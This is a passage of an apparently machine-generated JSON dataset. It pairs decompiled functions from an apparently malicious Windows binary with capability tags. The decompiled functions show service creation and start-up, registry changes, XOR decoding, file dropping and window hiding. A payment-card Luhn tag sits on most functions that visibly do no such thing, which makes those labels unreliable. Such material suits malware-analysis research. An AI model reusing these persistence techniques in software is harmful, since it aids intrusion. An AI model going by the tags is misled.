return;\n}\n",
        "token_count": 371
    },
    "00402590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040271f) overlaps instruction at (ram,0x0040271e)\n// \n\nuint * __fastcall fcn.00402590(int32_t *param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint *in_EAX;\n    uint *puVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint16_t uVar7;\n    int32_t unaff_EBX;\n    uint *puVar8;\n    uint *puVar9;\n    uint *puVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    uint *unaff_EDI;\n    bool bVar13;\n    float10 in_ST0;\n    int32_t *piStack24;\n    \n    puVar9 = &stack0xfffffffc;\n    piStack24 = param_1;\n    do {\n        puVar4 = in_EAX;\n        piVar3 = piStack24;\n        bVar13 = (param_1 - 5U & 0x44) != 0;\n        puVar12 = puVar9[2];\n        *puVar12 = 0x90;\n        if ((bVar13) && (!bVar13)) {\n            puVar4 = puVar4 & 0xe2f4cc58;\n        }\n        puVar12[1] = 0x70;\n        uVar2 = param_2 & 0xffff;\n        piStack24 = uVar2 | puVar4 << 0x10;\n        uVar7 = param_2 - 1U & piVar3;\n        uVar5 = POPCOUNT(uVar7 & 0xff);\n        puVar12[2] = 0x7c;\n        in_EAX = unaff_EDI;\n        if ((uVar7 < 0) || (in_EAX = unaff_EDI & 0xffff | piVar3 << 0x10,  uVar7 >= 0)) {\n            puVar12[3] = 1;\n        }\n        else {\n            puVar11 = puVar4 + 1;\n            puVar4 = puVar12 + *piVar3;\n            uVar5 = POPCOUNT(puVar4 & 0xff);\n            puVar12 = puVar11;\n        }\n        bVar13 = (uVar5 & 1) == 0;\n        puVar10 = puVar9;\n        puVar11 = puVar12;\n        if ((bVar13) || (!bVar13)) goto code_r0x00402626;\n        puVar11 = *unaff_EDI;\n        *unaff_EDI = puVar12;\n        puVar9 = puVar9 - *(puVar9 + 0x5f9dff63);\n        param_1 = piVar3;\n    } while (puVar9 < 0);\n    puVar10 = puVar9;\n    if (puVar11 < 0) {\ncode_r0x00402626:\n        puVar11[4] = 0x66;\n        puVar8 = &stack0xffffffec;\n        uVar5 = uVar2;\n        uVar6 = uVar5 ^ unaff_EBX >> 8 | 0x67;\n        puVar11[5] = 0x91;\n        if ((uVar6 < '\\x01') || ('\\0' < uVar6)) {\n            puVar11[6] = 0x72;\n        }\n        else {\n            in_ST0 = in_ST0 - *(puVar10 + 0x46c692c9);\n        }\n        bVar13 = ((CONCAT11((puVar4 >> 8) + -0x2b, puVar4) ^ 0x3d) + 0x7c28 ^ CONCAT11(uVar2 >> 8 | uVar5, uVar5)) !=\n                 0x4001;\n        puVar11[7] = 0x56;\n        puVar9 = puVar10;\n        if ((bVar13) && (!bVar13)) {\n            cVar1 = '\\x10';\n            do {\n                puVar10 = puVar10 + -1;\n                puVar8 = puVar8 + -1;\n                *puVar8 = *puVar10;\n                cVar1 = cVar1 + -1;\n                puVar9 = &stack0xffffffec;\n            } while ('\\0' < cVar1);\n        }\n        puVar11[8] = 0xff;\n    }\n    puVar11[9] = 0x34;\n    puVar11[10] = 0x7a;\n    puVar11[0xb] = 0xab;\n    puVar11[0xc] = 0xfd;\n    puVar11[0xd] = 0x87;\n    bVar13 = (POPCOUNT(unaff_EBX + 1U & 0xff) & 1U) == 0;\n    puVar11[0xe] = 0xdb;\n    if (((!bVar13) && (bVar13)) || (puVar11[0xf] = 0xba,  !bVar13)) {\n        *(param_2 + 0x1a) = *(param_2 + 0x1a) ^ 0x800;\n        *(unaff_EBX + -0x2478990a) = in_ST0;\n        if ((POPCOUNT(puVar11 + 0x46 & 0xff) & 1U) == 0) {\n            puVar4 = &stack0xffffffec;\n            cVar1 = '\\x1e';\n            do {\n                puVar9 = puVar9 + -1;\n                puVar4 = puVar4 + -1;\n                *puVar4 = *puVar9;\n                cVar1 = cVar1 + -1;\n            } while ('\\0' < cVar1);\n            puVar9 = in(0x78);\n            return puVar9;\n        }\n    }\n    puVar9 = puVar9[3];\n    *puVar9 = 0x10;\n    return puVar9;\n}\n",
        "token_count": 1366
    },
    "00402750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040277e) overlaps instruction at (ram,0x0040277b)\n// \n// WARNING: Removing unreachable block (ram,0x0040276f)\n// WARNING: Removing unreachable block (ram,0x00402777)\n\nvoid __cdecl fcn.00402750(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00402590(&var_68h, &var_4h);\n    fcn.00404490(&var_68h, var_4h, 0x406524, 0xa060);\n    *arg_8h = 0x406524;\n    *arg_ch = 0xa060;\n    return;\n}\n",
        "token_count": 296
    },
    "00402990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value",
            "delete registry key"
        ],
        "decompiled_code": "\nvoid fcn.00402990(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uchar *puStack296;\n    uchar uStack276;\n    uint uStack275;\n    uint uStack271;\n    uint uStack267;\n    ushort uStack263;\n    uchar uStack261;\n    uchar uStack260;\n    uint uStack259;\n    \n    uStack275 = 0;\n    uStack271 = 0;\n    uStack267 = 0;\n    uStack276 = 0;\n    uStack263 = 0;\n    uStack260 = 0;\n    uStack261 = 0;\n    puVar4 = &stack0xfffffefd;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    fcn.00401f00();\n    puStack296 = 0x4029da;\n    fcn.00403f80(&stack0xfffffeec, 5);\n    pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n    puStack296 = &stack0xfffffefc;\n    puStack300 = 0x4029f4;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    puStack296 = 0x402a07;\n    (*_sym.imp.SHLWAPI.dll_SHDeleteKeyA)();\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    puStack300 = &stack0xfffffee4;\n    puStack296 = 0x10;\n    uStack304 = 1;\n    uStack308 = 0x41e5b0;\n    uStack312 = 0x406368;\n    uStack316 = 0x80000000;\n    uStack320 = 0x402a27;\n    (*_sym.imp.SHLWAPI.dll_SHSetValueA)();\n    uStack320 = 0x4b;\n    uStack324 = 0x40639c;\n    uStack328 = 1;\n    uStack332 = 0x41e5b0;\n    (*pcVar2)(0x80000000, &stack0xfffffedc);\n    (*pcVar1)(&stack0xfffffec4, 0x4063e8, &stack0xfffffeb4);\n    (*pcVar2)(0x80000000, &stack0xfffffec4, 0x406424, 1, 0x40642c, 0x14);\n    return;\n}\n",
        "token_count": 656
    },
    "00402ec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.00402ec0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x406104);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x41e5bc = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x406114);\n    *0x41e5c0 = (*pcVar1)(iVar2, 0x406130);\n    *0x41e5c4 = (*pcVar1)(iVar2, 0x406140);\n    if (((*0x41e5bc != 0) && (*0x41e5c0 != 0)) && (*0x41e5c4 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 211
    },
    "00402f90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402f90(uint filename, uint mode, uint ptr, uint nitems, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 != 0) {\n        (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n        (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n        if (arg_18h != 0) {\n            (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 154
    },
    "00403230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403282) overlaps instruction at (ram,0x0040327d)\n// \n// WARNING: Removing unreachable block (ram,0x0040326c)\n\nchar * __cdecl fcn.00403230(char *arg_8h, uchar *arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    ushort in_DX;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar1 = arg_ch + (arg_8h - arg_14h);\n    if ((pcVar1 != NULL) && (pcVar1 == NULL)) {\n        arg_8h = arg_8h & 0xffffff00 | *0x4bb148d3;\n        out(*arg_ch, in_DX);\n    }\n    if (arg_14h != 0) {\n        for (; arg_8h <= pcVar1; arg_8h = arg_8h + 1) {\n            if (*arg_8h == *arg_10h) {\n                bVar5 = true;\n                iVar2 = arg_14h;\n                pcVar3 = arg_8h;\n                pcVar4 = arg_10h;\n                do {\n                    pcVar4 = pcVar4 + 1;\n                    pcVar3 = pcVar3 + 1;\n                    iVar2 = iVar2 + -1;\n                    if (iVar2 == 0) break;\n                    bVar5 = *pcVar3 == *pcVar4;\n                } while (bVar5);\n                if (bVar5) {\n                    return arg_8h;\n                }\n            }\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 396
    },
    "004032d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nchar * __cdecl fcn.004032d0(char *arg_8h, uint noname_1, char *arg_10h, int32_t arg_14h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    char *in_EDX;\n    char *pcVar2;\n    char *unaff_ESI;\n    bool in_CF;\n    bool bVar3;\n    bool in_ZF;\n    bool in_OF;\n    \n    if ((in_CF || in_ZF) || (!in_CF && !in_ZF)) {\n        uVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n        pcVar2 = fcn.00404030(uVar1, arg_8h);\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar1);\n        return pcVar2;\n    }\n    if (!in_OF) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    do {\n        bVar3 = true;\n        pcVar2 = in_EDX;\n        do {\n            unaff_ESI = unaff_ESI + 1;\n            pcVar2 = pcVar2 + 1;\n            if (in_ECX == 0) break;\n            in_ECX = in_ECX + -1;\n            bVar3 = *pcVar2 == *unaff_ESI;\n        } while (bVar3);\n        if (bVar3) {\n            return in_EDX;\n        }\n        do {\n            in_EDX = in_EDX + 1;\n            if (arg_8h < in_EDX) {\n                return NULL;\n            }\n        } while (*in_EDX != *arg_10h);\n        in_ECX = arg_14h + -1;\n        unaff_ESI = arg_10h;\n    } while( true );\n}\n",
        "token_count": 426
    },
    "00403f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403fba) overlaps instruction at (ram,0x00403fb1)\n// \n\nvoid __cdecl fcn.00403f80(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    \n    uVar2 = 0;\n    bVar3 = false;\n    if (arg_ch != 0) {\n        do {\n            if ((bVar3) || (!bVar3)) {\n                iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            }\n            else {\n                *(uVar2 + 0x43d1773a) = *(uVar2 + 0x43d1773a) ^ 0xff27e95e;\n                iVar1 = in_EAX + !bVar3 + 0x7ccf1bb5;\n            }\n            in_EAX = iVar1 / 0x1a;\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n            bVar3 = uVar2 < arg_ch;\n        } while (bVar3);\n    }\n    return;\n}\n",
        "token_count": 288
    },
    "00404030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404083) overlaps instruction at (ram,0x00404080)\n// \n// WARNING: Removing unreachable block (ram,0x00404056)\n\nuint fcn.00404030(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    ushort extraout_CX;\n    uint *unaff_EDI;\n    uint *puVar4;\n    bool bVar5;\n    char in_SF;\n    char in_OF;\n    ushort in_stack_ffffffd8;\n    uint uVar6;\n    \n    puVar4 = unaff_EDI;\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        out(0xc4, in_EAX);\n        puVar4 = unaff_EDI + 1;\n        *unaff_EDI = in_EAX;\n    }\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(param_1, param_2, 0xf01ff);\n    bVar5 = iVar2 == 0;\n    if (bVar5) {\n        return 0;\n    }\n    if ((bVar5) || (uVar6 = CONCAT22(extraout_CX, in_stack_ffffffd8),  !bVar5)) {\n        uVar6 = 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0x47, uVar6, puVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (((iVar3 == 0) && (iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar3 != 0x420)) &&\n       (iVar3 = (*pcVar1)(),  iVar3 != 0x422)) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 464
    },
    "00404280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004042c3) overlaps instruction at (ram,0x004042c2)\n// \n// WARNING: Removing unreachable block (ram,0x0040430b)\n// WARNING: Removing unreachable block (ram,0x004043eb)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00404280(char *arg_8h, uint *arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    char *in_EAX;\n    char *pcVar4;\n    char *in_ECX;\n    int32_t *piVar5;\n    uint8_t uVar6;\n    int32_t *in_EDX;\n    char cVar7;\n    uint32_t unaff_EBX;\n    uchar *unaff_ESI;\n    uchar *puVar8;\n    char **unaff_EDI;\n    char **ppcVar9;\n    ushort in_SS;\n    bool in_CF;\n    uint8_t in_AF;\n    uint8_t uVar10;\n    uchar in_ZF;\n    bool bVar11;\n    char in_SF;\n    bool bVar12;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char in_OF;\n    bool bVar13;\n    uint8_t in_NT;\n    unkbyte10 in_ST0;\n    int32_t *piStackY32;\n    int16_t iStack22;\n    \n    iStack22 = unaff_EBX;\n    if (((in_OF == in_SF) && (in_OF != in_SF)) ||\n       (*arg_8h = -0x6d,  pcVar4 = arg_8h,  in_EAX = arg_8h,  piStackY32 = in_EDX,  uVar10 = in_AF,  !in_CF)) {\n        *(in_EAX + -0x7ce92414) = in_ST0;\n        uVar2 = in_EAX + -1;\n        bVar11 = 9 < (uVar2 & 0xf);\n        uVar10 = bVar11 | in_AF;\n        uVar2 = uVar2 + uVar10 * '\\x06';\n        uVar2 = uVar2 + (0x90 < (uVar2 & 0xf0) | in_CF | uVar10 * (0xf9 < uVar2)) * '`';\n        *in_EDX = *in_EDX + 0x458bdf84;\n        uVar6 = in_EDX;\n        piStackY32 = in_EDX & 0xffff0000 | CONCAT11(in_EDX >> 8 | uVar2, uVar6);\n        puVar1 = unaff_EBX + 0x57661672;\n        in_CF = CARRY1(*puVar1, uVar6);\n        *puVar1 = *puVar1 + uVar6;\n        in_ZF = *puVar1 == 0;\n        unaff_EDI = unaff_EDI & 0xffff0000 | unaff_EBX & 0xffff;\n        pcVar4 = in_EAX + -1 & 0xffffff00 | uVar2;\n        if (in_CF) {\n            cVar7 = uVar2 - *unaff_EDI;\n            func_0x1018a22b((in_NT & 1) * 0x4000 | SBORROW1(uVar2, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                            (in_TF & 1) * 0x100 | (cVar7 < '\\0') * 0x80 | (cVar7 == '\\0') * 0x40 |\n                            (bVar11 | in_AF & 1) * 0x10 | ((POPCOUNT(cVar7) & 1U) == 0) * 4 | uVar2 < *unaff_EDI);\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    pcVar4[1] = -0x58;\n    ppcVar9 = unaff_EDI;\n    if (in_CF || in_ZF) goto code_r0x004042cb;\n    if (!in_CF && !in_ZF) goto code_r0x004042cb;\n    while( true ) {\n        pcVar4 = pcVar4 & 0xe2f4cc58;\n        ppcVar9 = unaff_EDI;\ncode_r0x004042cb:\n        pcVar4[2] = '}';\n        piVar5 = in_ECX & 0xffff0000 | CONCAT11((in_ECX >> 8) - unaff_EBX, in_ECX);\n        bVar13 = SBORROW4(piVar5, piStackY32);\n        bVar12 = piVar5 - piStackY32 < 0;\n        bVar11 = piVar5 == piStackY32;\n        arg_8h[3] = -0x4a;\n        unaff_EDI = ppcVar9;\n        if ((piStackY32 <= piVar5) && (piVar5 < piStackY32)) {\n            out(0xc4, pcVar4);\n            piStackY32 = piStackY32 & 0xffffff00 | piStackY32 ^ arg_8h;\n            unaff_EDI = ppcVar9 + 1;\n            *ppcVar9 = pcVar4;\n            cVar7 = unaff_EBX >> 8;\n            bVar13 = SBORROW1(cVar7, *pcVar4);\n            bVar12 = cVar7 - *pcVar4 < '\\0';\n            bVar11 = cVar7 == *pcVar4;\n        }\n        arg_8h[4] = '\\x0f';\n        if ((!bVar13) && (bVar13)) {\n            LOCK();\n            unaff_ESI = 0x138b2633;\n            bVar13 = SCARRY4(pcVar4, 0x658f517f);\n            pcVar4 = pcVar4 + 0x658f517f;\n            bVar12 = pcVar4 < 0;\n            bVar11 = pcVar4 == NULL;\n        }\n        arg_8h[5] = 'h';\n        if ((bVar11 || bVar13 != bVar12) || (!bVar11 && bVar13 == bVar12)) break;\n        uVar10 = 9 < (pcVar4 & 0xf) | uVar10;\n        pcVar4 = pcVar4 & 0xffff0000 | CONCAT11((pcVar4 >> 8) + uVar10, pcVar4 + uVar10 * '\\x06') & 0xff0f;\n        in_ECX = arg_8h;\n        if (arg_8h != NULL) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    arg_8h[6] = -0x1f;\n    puVar8 = unaff_ESI;\n    if (bVar13) goto code_r0x0040436e;\n    do {\n        puVar8 = unaff_ESI;\n        if (bVar13) {\n            LOCK();\n            puVar8 = 0x138b2633;\n            pcVar4 = pcVar4 + 0x658f517f;\n        }\ncode_r0x0040436e:\n        arg_8h[7] = -0x29;\n        bVar13 = false;\n        uVar3 = pcVar4 + iStack22 | 0x11a9;\n        bVar12 = uVar3 == 0;\n        bVar11 = (POPCOUNT(uVar3 & 0xff) & 1U) == 0;\n        arg_8h[8] = '\\x03';\n        unaff_ESI = puVar8;\n        if ((!bVar12) && (bVar12)) {\n            unaff_ESI = puVar8 + 1;\n            out(*puVar8, piStackY32);\n        }\n        arg_8h[9] = -0x38;\n        if ((bVar11) || (!bVar11)) goto code_r0x004043ca;\n        ppcVar9 = segment(in_SS, *0x10 + -0x14);\n        pcVar4 = *ppcVar9;\n        piStackY32 = 0xb7bc9ea5;\n    } while (bVar11);\n    bVar12 = *0x10 == 0x10;\ncode_r0x004043ca:\n    arg_8h[10] = 'N';\n    if ((bVar12) || (arg_8h = (arg_8h >> 8 & 0xffff00) << 8 | arg_8h & 0xffff,  !bVar12)) {\n        arg_8h[0xb] = '0';\n    }\n    *arg_ch = 0xc;\n    return;\n}\n",
        "token_count": 1996
    },
    "00404490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004045df) overlaps instruction at (ram,0x004045db)\n// \n\nuint * __thiscall fcn.00404490(uint8_t param_1, uint *param_2, uint32_t param_3, uint *param_4, uint *param_5)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    uint64_t uVar4;\n    uint32_t uVar5;\n    uint *puVar7;\n    uint16_t extraout_CX;\n    uchar *extraout_ECX;\n    uchar *puVar8;\n    uint extraout_ECX_00;\n    int16_t extraout_DX;\n    int32_t unaff_EBX;\n    int32_t iVar9;\n    uint unaff_ESI;\n    uint *puVar10;\n    bool bVar11;\n    char cVar12;\n    bool bVar13;\n    char cVar14;\n    uint *puVar6;\n    \n    puVar10 = NULL;\n    bVar13 = false;\n    bVar11 = param_5 == NULL;\n    puVar7 = param_5;\n    iVar9 = unaff_EBX;\n    puVar6 = param_5;\n    if (!bVar11) {\n        do {\n            if ((bVar11 || bVar13 != puVar6 < 0) || (!bVar11 && bVar13 == puVar6 < 0)) {\n                param_1 = *(puVar10 + param_4);\n            }\n            else {\n                iVar9 = iVar9 + 1;\n                *(puVar7 + -0x75c625aa) = *(puVar7 + -0x75c625aa) ^ param_1;\n            }\n            uVar4 = ZEXT48(puVar10) % param_3;\n            param_1 = param_1 ^ *(uVar4 + param_2);\n            if ((param_1 == 0) || (param_1 != 0)) {\n                *(puVar10 + param_4) = param_1;\n                puVar10 = puVar10 + 1;\n                puVar6 = param_5;\n            }\n            else {\n                puVar7 = param_4 + 1;\n                uVar2 = in(uVar4);\n                *param_4 = uVar2;\n                puVar6 = param_2;\n                param_4 = puVar7;\n                if (&stack0xfffffff0 < 1) {\n                    puVar1 = param_2 + -1;\n                    uVar3 = *puVar1;\n                    *puVar1 = *puVar1 + uVar4;\n                    uVar5 = CARRY1(uVar3, uVar4);\n                    cVar14 = SCARRY4(param_2, 0x405074) != SCARRY4(param_2 + 0x10141d, uVar5);\n                    iVar9 = param_2 + 0x10141d + uVar5;\n                    cVar12 = iVar9 < 0;\n                    bVar11 = iVar9 == 0;\n                    (*_sym.imp.MSVCRT.dll_sprintf)();\n                    if ((bVar11 || cVar14 != cVar12) || (puVar8 = extraout_ECX,  !bVar11 && cVar14 == cVar12)) {\n                        puVar8 = &stack0xfffffff4;\n                    }\n                    fcn.00404400(&stack0xfffffff8, puVar8);\n                    bVar11 = false;\n                    bVar13 = (extraout_DX - 1U & extraout_CX) == 0;\n                    fcn.00404650(unaff_EBX);\n                    puVar8 = &stack0xfffffffc;\n                    if ((!bVar11 && !bVar13) && (puVar8 = &stack0xfffffffc,  bVar11 || bVar13)) {\n                        *puVar7 = *puVar10;\n                        unaff_ESI = extraout_ECX_00;\n                        puVar8 = 0x8be181cf;\n                    }\n                    iVar9 = fcn.00402f90(puVar8 + -0x10c, 0x406044, *(puVar8 + -4), unaff_ESI, 1);\n                    if (iVar9 != 0) {\n                        fcn.00401f60();\n                        return 0x1;\n                    }\n                    return NULL;\n                }\n            }\n            uVar5 = puVar6 ^ 0xdee0ed6d;\n            puVar7 = uVar5 & 0xffff0000 | uVar5 + (uVar5 >> 8) * -0x31;\n            *(iVar9 + 0xc881445) = *(iVar9 + 0xc881445) ^ param_1;\n            puVar10 = puVar10 + 1;\n            bVar13 = SBORROW4(puVar10, puVar7);\n            bVar11 = puVar10 - puVar7 == NULL;\n            puVar6 = puVar10 - puVar7;\n        } while (puVar10 < puVar7);\n    }\n    return puVar7;\n}\n",
        "token_count": 1125
    },
    "004048b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004048b0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 139
    },
    "00404400": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404400(uint *arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    bool bVar6;\n    uint uStack124;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    puVar4 = &stack0xfffffffc;\n    var_4h = 0;\n    var_68h = 0;\n    puVar5 = &fcn.00404400::var_67h;\n    for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    bVar6 = true;\n    uStack124 = 0x404434;\n    fcn.00404280(&stack0xffffff94, &fcn.00404400::var_4h);\n    if ((!bVar6) && (bVar6)) {\n        puVar5 = &stack0xffffff84;\n        cVar1 = '\\x1e';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar4;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar2 = in(0x78);\n        return uVar2;\n    }\n    uStack124 = 0xe000;\n    uVar2 = fcn.00404490(&stack0xffffff94, var_4h, 0x410590);\n    *arg_8h = 0x410590;\n    *arg_ch = 0xe000;\n    return uVar2;\n}\n",
        "token_count": 434
    },
    "004016f0": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401740) overlaps instruction at (ram,0x0040173f)\n// \n\nuint fcn.004016f0(uint param_1)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint8_t *unaff_EDI;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    \n    iVar3 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x40651c, 0x41e5b0, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, param_1, 0);\n    if (iVar3 != 0) {\n        uVar2 = iVar3;\n        cVar1 = uVar2 - *unaff_EDI;\n        uVar4 = func_0x101876b2((in_NT & 1) * 0x4000 | SBORROW1(uVar2, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                                (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 |\n                                (in_AF & 1) * 0x10 | ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar2 < *unaff_EDI |\n                                (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n                                (in_AC & 1) * 0x40000);\n        (*_sym.imp.USER32.dll_ShowWindow)(uVar4);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 485
    },
    "00404510": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004045df) overlaps instruction at (ram,0x004045db)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00404510(uint arg_8h)\n\n{\n    uint16_t uVar1;\n    uint16_t extraout_CX;\n    int32_t iVar2;\n    uint *extraout_ECX;\n    uint *arg_ch;\n    uint extraout_ECX_00;\n    int16_t extraout_DX;\n    uchar *puVar3;\n    uint *unaff_ESI;\n    uint *puVar4;\n    bool bVar5;\n    uchar uVar6;\n    bool bVar7;\n    char cVar8;\n    char cVar9;\n    uchar lpBuffer;\n    uint var_20fh;\n    uint var_10ch;\n    uint uStack12;\n    uint uStack8;\n    \n    lpBuffer = 0;\n    var_10ch._0_1_ = 0;\n    puVar4 = &var_20fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    puVar4 = &var_10ch + 1;\n   